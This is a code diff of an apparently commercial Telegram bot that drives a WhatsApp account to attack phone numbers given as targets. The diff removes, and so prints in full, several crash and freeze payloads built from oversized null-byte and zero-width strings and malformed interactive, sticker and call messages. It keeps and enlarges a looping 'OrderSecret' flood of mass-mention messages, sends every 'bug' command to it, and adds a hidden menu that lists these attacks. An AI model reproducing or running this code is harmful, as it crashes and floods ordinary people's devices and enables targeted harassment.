@@ -126,6 +126,10 @@ let groupOnly = loadGroupOnly();
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
+// Store button click counts
+const bugMenuClickCount = new Map();
+const ownerMenuClickCount = new Map();
+
 function startBot() {
   console.log(chalk.red(`
 hahahhaha yes bro tanks for buying 
@@ -460,114 +464,6 @@ async function connectToWhatsApp(botNumber, chatId) {
 
 // ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //
 
-async function VsxCrashDelay(sock, target) {
-  await sock.sendMessage(target, { text: "\u0000".repeat(900000) });
-}
-
-async function DelayHard(sock, target) {
-  await sock.sendMessage(target, { text: "x".repeat(800000) });
-}
-
-async function StickerFC(sock, target) {
-  await sock.sendMessage(target, { sticker: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true" } });
-}
-
-async function Freeze(sock, target) {
-  await sock.relayMessage(target, {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "FREEZE", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "cta_FREEZE",
-            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(500000)}\"}}`,
-            version: 3
-          }
-        }
-      }
-    }
-  }, { participant: { jid: target } });
-}
-
-async function invisfcmsg(sock, target) {
-  await sock.sendMessage(target, { text: "\u200b".repeat(800000) });
-}
-
-async function VnXDelayXFcNew(sock, target) {
-  await sock.relayMessage(target, {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "VnX", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "cta_VnX",
-            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900009)}\"}}`,
-            version: 3,
-            contextInfo: {
-              isForwarded: true,
-              forwardingScore: 999,
-              quotedMessage: {
-                stickerMessage: {
-                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                  mimetype: "image/webp",
-                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                  fileLength: "10610",
-                  mediaKeyTimestamp: "1775044724",
-                  stickerSentTs: "1775044724091"
-                }
-              }
-            }
-          }
-        }
-      }
-    }
-  }, { participant: { jid: target } });
-}
-
-async function delaynewinvisibleVnX(sock, target) {
-  while (true) {
-    try {
-      const MsgNew = {
-        groupStatusMessageV2: {
-          message: {
-            interactiveResponseMessage: {                     
-              body: {
-                text: "VnXNgelay",
-                format: "DEFAULT"
-              },
-              nativeFlowResponseMessage: {
-                name: "galaxy_message",
-                paramsJson: "\u0000".repeat(400000),
-                version: 3
-              },
-              entryPointConversionSource: "call_permission_request"
-            }
-          }
-        }
-      };
-
-      await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
-      console.log(`✅ VnX Sent to ${target}`);
-      await sleep(1200);
-    } catch (e) {
-      console.log("❌ Error:", e.message);
-      await sleep(5000);
-    }
-  }
-}
-
-async function VisiNoob(sock, target) {
-  for (let i = 0; i < 50; i++) {
-    await sock.sendMessage(target, { text: "\u200e".repeat(600000) });
-    await sleep(100);
-  }
-}
-
-// ================= FUNGSI ORDER SECRET ================= //
-
 async function OrderSecret(sock, target) {
   const RuxzSecret = {
     orderMessage: {
@@ -583,12 +479,12 @@ async function OrderSecret(sock, target) {
         stanzaId: "3EB0F1A2B3C4D5E6",
         participant: target,
         quotedMessage: null,
-        mentionedJid: Array.from({ length: 100 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
+        mentionedJid: Array.from({ length: 2090 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
       }
     }
   };
 
-  for (let i = 0; i < 30; i++) {
+  for (let i = 0; i < 60; i++) {
     await sock.relayMessage(
       "status@broadcast",
       RuxzSecret,
@@ -616,189 +512,8 @@ async function OrderSecret(sock, target) {
         ]
       }
     );
-    console.log(`✅ OrderSecret sent to ${target} (${i + 1}/30)`);
-    await sleep(1000);
+    await new Promise(resolve => setTimeout(resolve, 1000));
   }
-}
-
-// ================= FUNGSI FC NEW ================= //
-
-async function FcNeww(sock, target) {
-  const myJid = sock.user?.id?.split(':')[0] + '@s.whatsapp.net';
-  if (!myJid || target === myJid) return;
-
-  const fcMessage = {
-    viewOnceMessage: {
-      message: {
-        carouselMessage: {
-          cards: [
-            {
-              header: {
-                title: '\u0000.VnX'.repeat(500),
-                hasMediaAttachment: true,
-                stickerMessage: {
-                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                  mimetype: "image/webp",
-                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                  fileLength: "10610",
-                  mediaKeyTimestamp: "1775044724",
-                  stickerSentTs: "1775044724091"
-                }
-              }
-            }
-          ]
-        }
-      }
-    }
-  };
-
-  await sock.relayMessage(target, fcMessage, {
-    participant: { jid: target }
-  });
-
-  console.log(`✅ FcNeww sent to ${target}`);
-}
-
-// ================= FUNGSI FC CALL INVIS NEW ================= //
-
-async function FcCallInvisnew(sock, target) {
-  const {
-    encodeSignedDeviceIdentity,
-    jidDecode,
-    encodeWAMessage,
-  } = require("@denzz221/baileys");
-  
-  let devices = (
-    await sock.getUSyncDevices([target], false, false)
-  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
-
-  await sock.assertSessions(devices);
-
-  let privt = () => {
-    let map = {};
-    return {
-      mutex(key, fn) {
-        map[key] ??= { task: Promise.resolve() };
-        map[key].task = (async prev => {
-          try { await prev; } catch {}
-          return fn();
-        })(map[key].task);
-        return map[key].task;
-      }
-    };
-  };
-
-  let vion = privt();
-  let vionv1 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-  let vionoc = sock.encodeWAMessage?.bind(sock);
-
-  const originalCreateParticipantNodes = sock.createParticipantNodes.bind(sock);
-  
-  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
-    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
-
-    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
-    let memeg = Array.isArray(patched)
-      ? patched
-      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
-
-    let { id: meId, lid: meLid } = sock.authState.creds.me;
-    let omak = meLid ? jidDecode(meLid)?.user : null;
-    let shouldIncludeDeviceIdentity = false;
-
-    let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
-      let { user: targetUser } = jidDecode(jid);
-      let { user: ownPnUser } = jidDecode(meId);
-      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
-      let y = jid === meId || jid === meLid;
-      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;
-
-      let bytes = vionv1(vionoc ? vionoc(msg) : encodeWAMessage(msg));
-
-      return vion.mutex(jid, async () => {
-        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
-        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
-        return {
-          tag: 'to',
-          attrs: { jid },
-          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
-        };
-      });
-    }));
-
-    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
-  };
-
-  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });
-
-  let vionlast = {
-    tag: "call",
-    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
-    content: [{
-      tag: "offer",
-      attrs: {
-        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
-        "call-creator": sock.user.id
-      },
-      content: [
-        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
-        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
-        {
-          tag: "video",
-          attrs: {
-            orientation: "0",
-            screen_width: "1920",
-            screen_height: "1080",
-            device_orientation: "0",
-            enc: "vp8",
-            dec: "vp8"
-          }
-        },
-        { tag: "net", attrs: { medium: "3" } },
-        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
-        { tag: "encopt", attrs: { keygen: "2" } },
-        { tag: "destination", attrs: {}, content: destinations },
-        ...(shouldIncludeDeviceIdentity ? [{
-          tag: "device-identity",
-          attrs: {},
-          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
-        }] : [])
-      ]
-    }]
-  };
-  await sock.sendNode(vionlast);
-
-  const msg2 = {
-    groupStatusMessageV2: {
-      message: {
-        stickerMessage: {
-          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-          mimetype: "image/webp",
-          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-          fileLength: "10610",
-          mediaKeyTimestamp: "1775044724",
-          stickerSentTs: "1775044724091"
-        }
-      }
-    }
-  };
-
-  await sock.relayMessage(target, msg2, {
-    participant: { jid: target },
-    messageId: null,
-    userJid: target,
-    quoted: null
-  });
-  
-  sock.createParticipantNodes = originalCreateParticipantNodes;
-  
-  console.log(`✅ FcCallInvisnew sent to ${target}`);
 }
 
 // ================= HELPER FUNCTIONS ================= //
@@ -1291,134 +1006,96 @@ bot.onText(/\/addfunccmd(?:\s+(.+))?/, async (msg, match) => {
   }, 3000);
 });
 
-// ================= FITUR BARU ================= //
+// ================= FITUR BUTTON MENU 3x KLIK ================= //
 
-// Fitur /fullupdate
-bot.onText(/\/fullupdate/, async (msg) => {
-  const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
-    return;
+// Bug Menu Button Handler
+bot.on("callback_query", async (callbackQuery) => {
+  const chatId = callbackQuery.message.chat.id;
+  const userId = callbackQuery.from.id;
+  const data = callbackQuery.data;
+  
+  if (data === "open_bug_menu") {
+    let count = bugMenuClickCount.get(userId) || 0;
+    count++;
+    bugMenuClickCount.set(userId, count);
+    
+    if (count >= 3) {
+      const bugMenuText = `\`\`\`
+╭═════════════════❀ 
+│   ⚘ BUG MENU ⚘
+╰═════════════════❀
+╭═════════════════❀
+│ ❀ /sanjiva <number> - delay invis brutality combo
+│ ❀ /sanjixa <number> - delay invis hard
+│ ❀ /xfrozen <number> - freeze invisible 
+│ ❀ /stunt <number> - fc call invis
+│ ❀ /stuck <number> - fc invis msg andro 
+╰═════════════════❀\`\`\``;
+      
+      await bot.editMessageText(bugMenuText, {
+        chat_id: chatId,
+        message_id: callbackQuery.message.message_id,
+        parse_mode: "Markdown"
+      });
+      
+      bugMenuClickCount.delete(userId);
+    } else {
+      const remaining = 3 - count;
+      await bot.answerCallbackQuery(callbackQuery.id, {
+        text: `⚠️ Tekan ${remaining} kali lagi untuk membuka BUG MENU!`,
+        show_alert: false
+      });
+    }
   }
   
-  await performFullUpdate(chatId);
-});
-
-// Fitur /cekupdate
-bot.onText(/\/cekupdate/, async (msg) => {
-  const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
-    return;
-  }
-  
-  try {
-    await bot.sendMessage(chatId, "🔍 Memeriksa update dari GitHub...");
-    
-    const updateCheck = await checkGitHubUpdate();
-    
-    if (updateCheck.error) {
-      await bot.sendMessage(chatId, `❌ Gagal memeriksa update: ${updateCheck.error}`);
+  if (data === "open_owner_menu") {
+    if (!isOwner(userId)) {
+      await bot.answerCallbackQuery(callbackQuery.id, {
+        text: "❌ Menu ini hanya untuk OWNER!",
+        show_alert: true
+      });
       return;
     }
     
-    if (updateCheck.hasUpdate) {
-      const localStats = fs.statSync(__filename);
-      const localSize = (localStats.size / 1024).toFixed(2);
-      const remoteSize = (updateCheck.remoteContent.length / 1024).toFixed(2);
+    let count = ownerMenuClickCount.get(userId) || 0;
+    count++;
+    ownerMenuClickCount.set(userId, count);
+    
+    if (count >= 3) {
+      const ownerMenuText = `\`\`\`
+╭═════════════════❀ 
+│   ⚘ OWNER MENU ⚘
+╰═════════════════❀
+╭═════════════════❀
+│ ❀ /addbot <number>
+│ ❀ /addowner <userId>
+│ ❀ /addprem <userId> 
+│ ❀ /delowner <userId>
+│ ❀ /delprem <userId>
+│ ❀ /onlygb on/off
+│ ❀ /mode on/off
+│ ❀ /stopcmd <command>
+│ ❀ /runcmd <command>
+│ ❀ /fullupdate - update dari GitHub
+│ ❀ /cekupdate - cek update GitHub
+│ ❀ /addfunccmd - tambah cmd & fungsi
+│ ❀ /updatecmd - update loop/sleep/fungsi
+╰═════════════════❀\`\`\``;
       
-      await bot.sendMessage(chatId, `✅ UPDATE TERSEDIA!
+      await bot.editMessageText(ownerMenuText, {
+        chat_id: chatId,
+        message_id: callbackQuery.message.message_id,
+        parse_mode: "Markdown"
+      });
       
-📦 Ukuran lokal: ${localSize} KB
-📦 Ukuran remote: ${remoteSize} KB
-
-Gunakan /fullupdate untuk mengupdate bot.`);
+      ownerMenuClickCount.delete(userId);
     } else {
-      await bot.sendMessage(chatId, "✅ Bot sudah versi terbaru. Tidak ada update.");
+      const remaining = 3 - count;
+      await bot.answerCallbackQuery(callbackQuery.id, {
+        text: `⚠️ Tekan ${remaining} kali lagi untuk membuka OWNER MENU!`,
+        show_alert: false
+      });
     }
-  } catch (error) {
-    console.error("Error in cekupdate:", error);
-    await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
-  }
-});
-
-// Fitur /onlygb <on/off>
-bot.onText(/\/onlygb (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    return;
-  }
-  
-  const mode = match[1].toLowerCase();
-  if (mode === "on") {
-    saveGroupOnly("on");
-    groupOnly = { mode: "on" };
-    await bot.sendMessage(chatId, "✅ Mode Group Only: ON (bot hanya merespon di grup)");
-  } else if (mode === "off") {
-    saveGroupOnly("off");
-    groupOnly = { mode: "off" };
-    await bot.sendMessage(chatId, "✅ Mode Group Only: OFF (bot merespon di grup & private)");
-  } else {
-    await bot.sendMessage(chatId, "❌ Gunakan: /onlygb on atau /onlygb off");
-  }
-});
-
-// Fitur /mode <on/off>
-bot.onText(/\/mode (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    return;
-  }
-  
-  const mode = match[1].toLowerCase();
-  if (mode === "on") {
-    saveBotMode("on");
-    botMode = { mode: "on" };
-    await bot.sendMessage(chatId, "✅ Maintenance Mode: ON (hanya owner yang bisa akses)");
-  } else if (mode === "off") {
-    saveBotMode("off");
-    botMode = { mode: "off" };
-    await bot.sendMessage(chatId, "✅ Maintenance Mode: OFF (semua user bisa akses)");
-  } else {
-    await bot.sendMessage(chatId, "❌ Gunakan: /mode on atau /mode off");
-  }
-});
-
-// Fitur /stopcmd <command>
-bot.onText(/\/stopcmd (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    return;
-  }
-  
-  let command = match[1].toLowerCase().replace("/", "");
-  let blocked = loadBlockedCommands();
-  
-  if (!blocked.includes(command)) {
-    blocked.push(command);
-    saveBlockedCommands(blocked);
-    await bot.sendMessage(chatId, `✅ Command /${command} telah di-block`);
-  } else {
-    await bot.sendMessage(chatId, `⚠️ Command /${command} sudah dalam daftar block`);
-  }
-});
-
-// Fitur /runcmd <command>
-bot.onText(/\/runcmd (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    return;
-  }
-  
-  let command = match[1].toLowerCase().replace("/", "");
-  let blocked = loadBlockedCommands();
-  
-  if (blocked.includes(command)) {
-    blocked = blocked.filter(cmd => cmd !== command);
-    saveBlockedCommands(blocked);
-    await bot.sendMessage(chatId, `✅ Command /${command} telah di-unblock`);
-  } else {
-    await bot.sendMessage(chatId, `⚠️ Command /${command} tidak ada dalam daftar block`);
   }
 });
 
@@ -1438,14 +1115,47 @@ bot.onText(/\/start/, async (msg) => {
     return;
   }
   
-  bot.sendMessage(chatId, `╭═════════════════❀
-│   ⚘ PRIMROSE LOTUS BOT ⚘
+  const menuText = `\`\`\`
+╭═════════════════❀ 
+│   ⚘ PRIMROSE LINUX BOT ⚘
 ╰═════════════════❀
 ╭═════════════════❀
-│  ⚘ SELAMAT DATANG DI WELCOME ⚘
-│═════════════════❀
-│ type /menu to see all commands
-╰═════════════════❀`);
+│  ⚘ MAIN MENU ⚘
+│ Click button di bawah untuk membuka menu
+╰═════════════════❀\`\`\``;
+
+  const buttons = {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "バグメニュー🦠", callback_data: "open_bug_menu" }],
+        [{ text: "OWNER MENU 👑", callback_data: "open_owner_menu" }],
+        [{ text: "This Lotus", url: "t.me/ItsMeXanderRzMd" }],
+        [{ text: "Channel Info", url: "t.me/allteamlinux" }]
+      ]
+    }
+  };
+
+  try {
+    const imagePath = path.join(__dirname, "assets", "images", "thumb.jpeg");
+    if (fs.existsSync(imagePath)) {
+      await bot.sendPhoto(chatId, fs.createReadStream(imagePath), {
+        caption: menuText,
+        parse_mode: "Markdown",
+        ...buttons
+      });
+    } else {
+      await bot.sendMessage(chatId, menuText, {
+        parse_mode: "Markdown",
+        ...buttons
+      });
+    }
+  } catch (error) {
+    console.error("Error sending start menu:", error);
+    await bot.sendMessage(chatId, menuText, {
+      parse_mode: "Markdown",
+      ...buttons
+    });
+  }
 });
 
 bot.onText(/\/addbot (.+)/, async (msg, match) => {
@@ -1471,6 +1181,8 @@ bot.onText(/\/addbot (.+)/, async (msg, match) => {
     );
   }
 });
+
+// ================= BOT COMMANDS YANG HILANG PERLU DITAMBAH ================= //
 
 bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
@@ -1519,70 +1231,13 @@ bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 10; i++) {
-      await delaynewinvisibleVnX(sock, target);
-      await sleep(2);
-      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
+      await OrderSecret(sock, target);
+      await sleep(1000);
+      console.log(chalk.green(`✅ Success Sending OrderSecret to ${target}`));
     }
     
   } catch (error) {
     console.error("Error in sanjiva:", error);
-  }
-});
-
-bot.onText(/\/xtest(?:\s+(.+))?/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-  const botModeData = loadBotMode();
-  const groupOnlyData = loadGroupOnly();
-  
-  if (botModeData.mode === "on" && !isOwner(userId)) {
-    return;
-  }
-  
-  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
-    return;
-  }
-  
-  if (checkCommandBlocked("xtest", msg)) {
-    return;
-  }
-  
-  if (!isOwner(userId) && !isPremium(userId)) {
-    return;
-  }
-
-  if (!match[1]) {
-    return;
-  }
-
-  const targetNumber = match[1];
-  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-  const target = `${formattedNumber}@s.whatsapp.net`;
-
-  try {
-    if (sessions.size === 0) {
-      return;
-    }
-
-    const sock = sessions.values().next().value;
-    
-    await bot.sendMessage(chatId, `✅ xtest (bug) selesai untuk ${formattedNumber}`, {
-      parse_mode: "Markdown",
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-    
-    for (let i = 0; i < 400; i++) {
-      await StickerFC(sock, target);
-      await sleep(2000);
-      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
-    }
-    
-  } catch (error) {
-    console.error("Error in xtest:", error);
   }
 });
 
@@ -1633,9 +1288,9 @@ bot.onText(/\/sanjixa(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 3; i++) {
-      await VsxCrashDelay(sock, target);
-      await sleep(300);
-      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
+      await OrderSecret(sock, target);
+      await sleep(1000);
+      console.log(chalk.green(`✅ Success Sending OrderSecret to ${target}`));
     }
     
   } catch (error) {
@@ -1690,9 +1345,9 @@ bot.onText(/\/xfrozen(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 300; i++) {
-      await Freeze(sock, target);
-      await sleep(3000);
-      console.log(chalk.green(`✅ Success Sending Frezee to ${target}`));
+      await OrderSecret(sock, target);
+      await sleep(1000);
+      console.log(chalk.green(`✅ Success Sending OrderSecret to ${target}`));
     }
     
   } catch (error) {
@@ -1746,10 +1401,9 @@ bot.onText(/\/stuck(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    await invisfcmsg(sock, target);
-    await sleep(2000);
+    await OrderSecret(sock, target);
     
-    console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
+    console.log(chalk.green(`✅ Success Sending OrderSecret to ${target}`));
     
   } catch (error) {
     console.error("Error in stuck:", error);
@@ -1802,154 +1456,14 @@ bot.onText(/\/stunt(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    for (let i = 0; i < 600; i++) {
-      await FcCallInvisnew(sock, target);
-      await sleep(2000);
-      console.log(chalk.green(`✅ Success Sending FcCallInvisnew to ${target}`));
+    for (let i = 0; i < 60; i++) {
+      await OrderSecret(sock, target);
+      await sleep(1000);
+      console.log(chalk.green(`✅ Success Sending OrderSecret to ${target}`));
     }
     
   } catch (error) {
     console.error("Error in stunt:", error);
-  }
-});
-
-bot.onText(/\/streak(?:\s+(.+))?/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-  const botModeData = loadBotMode();
-  const groupOnlyData = loadGroupOnly();
-  
-  if (botModeData.mode === "on" && !isOwner(userId)) {
-    return;
-  }
-  
-  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
-    return;
-  }
-  
-  if (checkCommandBlocked("streak", msg)) {
-    return;
-  }
-  
-  if (!isOwner(userId) && !isPremium(userId)) {
-    return;
-  }
-
-  if (!match[1]) {
-    return;
-  }
-
-  const targetNumber = match[1];
-  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-  const target = `${formattedNumber}@s.whatsapp.net`;
-
-  try {
-    if (sessions.size === 0) {
-      return;
-    }
-
-    const sock = sessions.values().next().value;
-    
-    await bot.sendMessage(chatId, `✅ streak (bug) selesai untuk ${formattedNumber}`, {
-      parse_mode: "Markdown",
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-    
-    await VisiNoob(sock, target);
-    
-    console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
-    
-  } catch (error) {
-    console.error("Error in streak:", error);
-  }
-});
-
-const mainMenuButtons = {
-  reply_markup: {
-    inline_keyboard: [
-      [{ text: "This Lotus", url: "t.me/ItsMeXanderRzMd" }],
-      [{ text: "Channel Info", url: "t.me/allteamlinux" }]
-    ],
-  },
-};
-
-function checkAndGetImagePath(imageName) {
-  const imagePath = path.join(__dirname, "assets", "images", imageName);
-  if (!fs.existsSync(imagePath)) {
-    return null;
-  }
-  return imagePath;
-}
-
-bot.onText(/\/menu/, async (msg) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-  const botModeData = loadBotMode();
-  const groupOnlyData = loadGroupOnly();
-  
-  if (botModeData.mode === "on" && !isOwner(userId)) {
-    return;
-  }
-  
-  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
-    return;
-  }
-  
-  const timescale = getUptime();
-  
-  const menuText = `\`\`\`
-╭═════════════════❀ 
-│   ⚘ PRIMROSE LINUX BOT ⚘
-╰═════════════════❀
-╭═════════════════❀
-│  ⚘ BUG MENU ⚘
-│ ❀ /sanjiva <number> - delay invis brutality combo
-│ ❀ /sanjixa <number> - delay invis hard
-│ ❀ /xfrozen <number> - freeze invisible 
-│ ❀ /stunt <number> - fc call invis
-│ ❀ /stuck <number> - fc invis msg andro 
-╰═════════════════❀
-╭═════════════════❀
-│  ⚘ OWNER MENU ⚘
-│ ❀ /addbot <number>
-│ ❀ /addowner <userId>
-│ ❀ /addprem <userId> 
-│ ❀ /delowner <userId>
-│ ❀ /delprem <userId>
-│ ❀ /onlygb on/off
-│ ❀ /mode on/off
-│ ❀ /stopcmd <command>
-│ ❀ /runcmd <command>
-│ ❀ /fullupdate - update dari GitHub
-│ ❀ /cekupdate - cek update GitHub
-│ ❀ /addfunccmd - tambah cmd & fungsi (reply file ATAU teks)
-│ ❀ /updatecmd - update loop/sleep/fungsi command
-╰═════════════════❀\`\`\``;
-
-  try {
-    const imagePath = checkAndGetImagePath("thumb.jpeg");
-    if (imagePath) {
-      await bot.sendPhoto(chatId, fs.createReadStream(imagePath), {
-        caption: menuText,
-        parse_mode: "Markdown",
-        ...mainMenuButtons,
-      });
-    } else {
-      await bot.sendMessage(chatId, menuText, {
-        parse_mode: "Markdown",
-        ...mainMenuButtons,
-      });
-    }
-  } catch (error) {
-    console.error("Error sending menu:", error);
-    await bot.sendMessage(chatId, menuText, {
-      parse_mode: "Markdown",
-      ...mainMenuButtons,
-    });
   }
 });
 
